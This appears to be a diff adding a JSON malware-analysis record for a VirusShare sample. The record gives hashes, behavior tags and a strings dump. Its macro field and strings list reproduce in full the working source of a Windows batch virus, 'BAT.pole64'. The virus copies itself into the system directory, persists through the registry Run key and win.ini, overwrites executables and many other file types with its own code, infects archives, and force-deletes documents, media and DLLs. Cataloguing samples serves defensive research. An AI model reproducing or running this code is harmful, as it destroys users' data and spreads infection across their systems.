@@ -1,0 +1,87 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Run": "May run an executable file or a system command",
+            "System": "May run an executable file or a system command on a Mac",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\n:: BAT.pole64_1\n:: by Razorblade\n\ntitle=pole64 by Razorblade\ncopy %0 \"%systemroot%\\pole64.bat\"\ncls\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v RMDir /t REG_SZ /d \"%systemroot%\\pole64.bat\" /f\ncls\necho [windows] >> \"%systemroot%\\win.ini\"\necho load=%systemroot%\\pole64.bat >> \"%systemroot%\\win.ini\"\necho run=%systemroot%\\pole64.bat >> \"%systemroot%\\win.ini\"\ncls\nfor %%a in (*.rar) do rar a %%a %0\nfor %%a in (*.arj) do arj a %%a %0\nfor %%a in (*.zip) do pkzip -a %%a %0\ncls\nlabel POLE64\ncls\ncopy %0 \"a:\\%random%.bat\ncls\nfor %%v in (*.exe) do copy %0 %%v\nfor %%v in (*.sys) do copy %0 %%v\nfor %%v in (*.ini) do copy %0 %%v\nfor %%v in (*.hlp) do copy %0 %%v\nfor %%v in (*.dll) do copy %0 %%v\nfor %%v in (*.ocx) do copy %0 %%v\nfor %%v in (*.inf) do copy %0 %%v\nfor %%v in (*.cfg) do copy %0 %%v\nfor %%v in (*.log) do copy %0 %%v\nfor %%v in (*.txt) do copy %0 %%v\nfor %%v in (*.bat) do copy %0 %%v\ncls\nif exist \"%programfiles%\\ICQLite\" (\n\tdel /f \"%programfiles%\\ICQLite\\ICQLite.exe\"\n) else (\n\techo ICQ Lite nicht gefunden ...\n)\ncls\ndel /f \"*.doc\"\ndel /f \"*.mp3\"\ndel /f \"*.exe\"\ndel /f \"*.dll\"\ndel /f \"*.txt\"\ndel /f \"*.avi\"\ncls\nexplorer http://www.pole64.com\ncls\necho %os% Error Logfile > \"C:\\ERROR.txt\"\necho ================ >> \"C:\\ERROR.txt\"\necho Pole64 >> \"C:\\ERROR.txt\"\necho by Razorblade >> \"C:\\ERROR.txt\"\necho - - - >> \"C:\\ERROR.txt\"\necho Ihr System wurde mit BAT.Pole64 infiziert! >> \"C:\\ERROR.txt\"\necho BITTE ENTFERNEN SIE DIESEN VIRUS >> \"C:\\ERROR.txt\"\ncls\nif exist \"%programfiles%\\EA GAMES\\Battlefield 1942\\BF1942.exe\" (\n\t:ui\n\tstart \"%programfiles%\\EA GAMES\\Battlefield 1942\\BF1942.exe\"\n\tgoto ui\n) else (\n\techo POLE 64 WINS\n)\n:1\ngoto 1"
+    },
+    "filename": "VirusShare_2ece76870f5e278fa9aefd936972342f",
+    "filesize": 1730,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2ece76870f5e278fa9aefd936972342f",
+        "sha1": "55ec7834b91a61a9f8ddac89a05c6bae64439411",
+        "sha256": "0ccf30cca81abca18da0a1015facbd259850eb21b530a827253636647a1c9704"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            ":: BAT.pole64_1",
+            ":: by Razorblade",
+            "title=pole64 by Razorblade",
+            "copy %0 \"%systemroot%\\pole64.bat\"",
+            "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v RMDir /t REG_SZ /d \"%systemroot%\\pole64.bat\" /f",
+            "echo [windows] >> \"%systemroot%\\win.ini\"",
+            "echo load=%systemroot%\\pole64.bat >> \"%systemroot%\\win.ini\"",
+            "echo run=%systemroot%\\pole64.bat >> \"%systemroot%\\win.ini\"",
+            "for %%a in (*.rar) do rar a %%a %0",
+            "for %%a in (*.arj) do arj a %%a %0",
+            "for %%a in (*.zip) do pkzip -a %%a %0",
+            "label POLE64",
+            "copy %0 \"a:\\%random%.bat",
+            "for %%v in (*.exe) do copy %0 %%v",
+            "for %%v in (*.sys) do copy %0 %%v",
+            "for %%v in (*.ini) do copy %0 %%v",
+            "for %%v in (*.hlp) do copy %0 %%v",
+            "for %%v in (*.dll) do copy %0 %%v",
+            "for %%v in (*.ocx) do copy %0 %%v",
+            "for %%v in (*.inf) do copy %0 %%v",
+            "for %%v in (*.cfg) do copy %0 %%v",
+            "for %%v in (*.log) do copy %0 %%v",
+            "for %%v in (*.txt) do copy %0 %%v",
+            "for %%v in (*.bat) do copy %0 %%v",
+            "if exist \"%programfiles%\\ICQLite\" (",
+            "\tdel /f \"%programfiles%\\ICQLite\\ICQLite.exe\"",
+            ") else (",
+            "\techo ICQ Lite nicht gefunden ...",
+            "del /f \"*.doc\"",
+            "del /f \"*.mp3\"",
+            "del /f \"*.exe\"",
+            "del /f \"*.dll\"",
+            "del /f \"*.txt\"",
+            "del /f \"*.avi\"",
+            "explorer http://www.pole64.com",
+            "echo %os% Error Logfile > \"C:\\ERROR.txt\"",
+            "echo ================ >> \"C:\\ERROR.txt\"",
+            "echo Pole64 >> \"C:\\ERROR.txt\"",
+            "echo by Razorblade >> \"C:\\ERROR.txt\"",
+            "echo - - - >> \"C:\\ERROR.txt\"",
+            "echo Ihr System wurde mit BAT.Pole64 infiziert! >> \"C:\\ERROR.txt\"",
+            "echo BITTE ENTFERNEN SIE DIESEN VIRUS >> \"C:\\ERROR.txt\"",
+            "if exist \"%programfiles%\\EA GAMES\\Battlefield 1942\\BF1942.exe\" (",
+            "\t:ui",
+            "\tstart \"%programfiles%\\EA GAMES\\Battlefield 1942\\BF1942.exe\"",
+            "\tgoto ui",
+            ") else (",
+            "\techo POLE 64 WINS",
+            "goto 1"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.pole64.com"
+        ]
+    },
+    "time": "0:00:00.315876",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
